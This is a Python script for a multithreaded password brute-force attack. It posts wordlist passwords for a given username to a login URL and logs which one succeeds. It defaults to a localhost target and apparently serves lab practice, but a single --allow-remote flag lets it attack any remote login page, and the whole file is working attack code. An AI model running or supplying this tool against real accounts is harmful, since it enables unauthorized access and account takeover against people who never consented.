import argparse
import os
import pathlib
import requests
import threading
from datetime import datetime
from queue import Queue
from urllib.parse import urlparse

# Input from command
parser = argparse.ArgumentParser(description='Description of the program: This program is used to generate wordlist')
parser.add_argument('--wordlist', type=pathlib.Path, required=True, help='File wordlist')
parser.add_argument('--username', type=str, required=True, help='Username which use to brute-force')
parser.add_argument('--target-url', type=str, default='http://127.0.0.1:5000/login', required=False, help='Target URL set [Default to http://127.0.0.1:5000/login]')
parser.add_argument('--threads', type=int, default=1, required=False, help='Multi-threaded worker(s) that POST to target')
parser.add_argument('--stop-on-success', default='True', type=str, required=False, help='[optional] [default = True] Stop on success log in.')
parser.add_argument('--log', default='logFile.txt', type=str, required=False, help='[optional] [default = BFlog.txt] put file name of output file')
parser.add_argument('--allow-remote', default='False', type=str, required=False, help='[optional] [default = False] allow targeting non-localhost hosts')

args = parser.parse_args()


target = args.target_url
threads = args.threads
stop_on_success = args.stop_on_success.lower() == 'true'
allow_remote = args.allow_remote.lower() == 'true'

# Check if target is localhost
parsed_url = urlparse(target)
is_localhost = parsed_url.hostname in ['127.0.0.1', 'localhost', '::1']

if not is_localhost and not allow_remote:
    print("Error: Target is not localhost. Use --allow-remote True to target non-localhost hosts.")
    exit(1)

# Read password file
wordlist = args.wordlist


log_text = []
log_lock = threading.Lock()
success_found = threading.Event()
password_queue = Queue()

def worker():
    """Worker thread function"""
    while not password_queue.empty() and not success_found.is_set():
        try:
            password = password_queue.get(timeout=1)
        except:
            break

        if success_found.is_set():
            password_queue.task_done()
            break

        try:
            data = {
                'username': args.username,
                'password': password
            }
            response = requests.post(target, data=data, timeout=10)

            with log_lock:
                if response.status_code == 200:
                    log = f"// Login success with password {password} with status code 200      {datetime.now().isoformat()}"
                    log_text.append(log)
                    print(f"[SUCCESS] Found password: {password}")
                    if stop_on_success:
                        success_found.set()
                else:
                    log = f"X Login failed with password {password} with status code {response.status_code}     {datetime.now().isoformat()}"
                    log_text.append(log)
                    print(f"[FAILED] Password: {password} - Status: {response.status_code}")

        except requests.exceptions.RequestException as e:
            with log_lock:
                log = f"X Error with password {password}: {str(e)}     {datetime.now().isoformat()}"
                log_text.append(log)
                print(f"[ERROR] Password: {password} - {str(e)}")
        finally:
            password_queue.task_done()

def brute_force(wordlist):
    """Main brute force function"""
    # Read all passwords and add to queue
    try:
        with open(wordlist) as f:
            for line in f:
                password = line.strip()
                if password:
                    password_queue.put(password)
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist}' not found.")
        exit(1)

    print(f"Loaded {password_queue.qsize()} passwords from wordlist")
    print(f"Starting brute force attack with {threads} threads...")
    print(f"Target: {target}")
    print(f"Username: {args.username}")
    print("-" * 50)

    # Create and start worker threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)


    for t in thread_list:
        t.join()

    print("-" * 50)
    print("Brute force attack completed.")


brute_force(wordlist)

# Write to log file
logfile_name = args.log
try:
    with open(logfile_name, "w") as f:
        print(f"\nWriting results to {logfile_name}...")
        for log in log_text:
            f.write(log + "\n")
    print(f"Log file saved: {logfile_name}")
except Exception as e:
    print(f"Error writing log file: {e}")
